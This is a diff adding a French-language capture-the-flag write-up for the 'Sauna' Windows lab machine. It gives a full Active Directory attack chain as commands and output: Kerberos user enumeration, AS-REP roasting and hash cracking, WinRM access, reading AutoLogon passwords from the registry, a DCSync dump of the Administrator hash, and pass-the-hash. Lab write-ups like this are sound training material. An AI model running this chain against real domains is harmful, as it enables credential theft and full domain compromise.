@@ -1,0 +1,160 @@
+---
+title: Sauna
+description: WU Sauna
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 2
+  badge:
+    text: 'easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Windows | <span style="color:green">**EASY**</span> | 10.129.95.180 |
+
+## Flags
+
+| Flag | Emplacement |
+|------|-------------|
+| User | `C:\Users\FSmith\Desktop\user.txt` |
+| Root | `C:\Users\Administrator\Desktop\root.txt` |
+
+## Résumé
+
+1. **Reconnaissance** : Enumération des employés via le site web de la banque
+2. **AS-REP Roasting** : Attaque contre le compte `fsmith` sans pré-authentification
+3. **Initial Access** : Connexion WinRM avec les credentials crackés
+4. **Privilege Escalation** : Découverte d'AutoLogon credentials via le registre
+5. **DCSync** : Exploitation des droits de réplication pour dumper l'Administrator
+
+---
+
+## Reconnaissance
+
+### Configuration initiale
+
+```bash
+export TARGET=10.129.95.180
+export DOMAIN=EGOTISTICAL-BANK.LOCAL
+export DC=sauna.EGOTISTICAL-BANK.LOCAL
+echo "$TARGET EGOTISTICAL-BANK.LOCAL sauna.EGOTISTICAL-BANK.LOCAL SAUNA" >> /etc/hosts
+```
+
+### Scan Nmap
+
+```bash
+nmap -p- $TARGET -sV -sC -oN nmap_full.txt
+```
+
+**Résultats critiques :**
+- Port 53: DNS
+- Port 80: IIS 10.0 (site web Egotistical Bank)
+- Port 88: Kerberos (vulnérable à l'AS-REP Roasting)
+- Port 389: LDAP
+- Port 445: SMB (signature requise)
+- Port 5985: WinRM (accès shell avec credentials valides)
+- **Clock skew** : +7 heures détecté (impact sur les opérations Kerberos)
+
+### Enumération Web
+
+```bash
+curl 10.129.95.180/about.html
+```
+
+**Noms d'employés extraits :**
+- Fergus Smith
+- Shaun Coins
+- Hugo Bear
+- Bowie Taylor
+- Sophie Driver
+- Steven Kerb
+
+## Génération et Validation des Usernames
+
+Génération de candidats avec les conventions courantes :
+- Noms complets (fergussmith, shauncoins, etc.)
+- Initiale + nom (fsmith, scoins, hbear, etc.)
+
+```bash
+kerbrute userenum users.txt -d $DOMAIN --dc $DC
+```
+
+**Résultat** : Seul `fsmith` est un compte AD valide
+
+## Attaque AS-REP Roasting
+
+Le compte `fsmith` a le flag "DONT_REQ_PREAUTH" activé, permettant l'AS-REP Roasting.
+
+```bash
+netexec ldap $DC -u fsmith@EGOTISTICAL-BANK.LOCAL -p '' --asreproast out.asreproast
+```
+
+**Type de hash** : `$krb5asrep$23$` (Kerberos 5 encryption RC4)
+
+```bash
+hashcat -m 18200 out.asreproast /usr/share/wordlists/rockyou.txt
+```
+
+**Credentials crackés** : `fsmith / Thestrokes23`
+
+## Accès Initial via WinRM
+
+```bash
+evil-winrm -i $TARGET -u fsmith -p 'Thestrokes23'
+```
+
+Shell utilisateur obtenu avec succès et récupération du flag user.
+
+## Post-Exploitation : AutoLogon Registry
+
+```powershell
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+```
+
+**Credentials découverts** : `svc_loanmgr / Moneymakestheworldgoround!`
+
+Ce compte de service possède des droits de réplication dangereux.
+
+## Attaque DCSync pour le Hash Administrator
+
+Le compte `svc_loanmgr` détient les permissions `DS-Replication-Get-Changes-All`, permettant l'exploitation DCSync.
+
+```bash
+date -s "+7 hours" && netexec smb $TARGET -u svc_loanmgr \
+  -p 'Moneymakestheworldgoround!' --ntds --user Administrator
+```
+
+**Résultat** : `Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e`
+
+Hash NT : `823452073d75b9d1cf70ebdf86c7f98e`
+
+## Pass-the-Hash pour l'Accès Administrateur
+
+```bash
+evil-winrm -i $TARGET -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+```
+
+Flag root obtenu avec succès.
+
+## Défis Techniques Résolus
+
+**Problème de Clock Skew** : La différence de 7 heures entre la machine attaquant et le contrôleur de domaine nécessitait une synchronisation temporelle avant les opérations dépendantes de Kerberos.
+
+**Gestion des Chemins Evil-WinRM** : Le conteneur Docker interprète les chemins relatifs depuis le répertoire de lancement.
+
+**Instabilité BloodHound** : Tentatives de connexion IPv6 et timeouts DNS rendaient la collecte peu fiable.
+
+**netexec vs secretsdump** : `secretsdump.py` d'Impacket connaissait des échecs silencieux dans Exegol v5.1.9, tandis que `netexec` fonctionnait de manière fiable.
+
+## Outils Utilisés
+
+- nmap (scan réseau)
+- kerbrute (énumération de comptes)
+- netexec (opérations LDAP/SMB/DCSync)
+- hashcat (crackage de mots de passe)
+- evil-winrm (shell distant)
+- reg query (examen du registre)
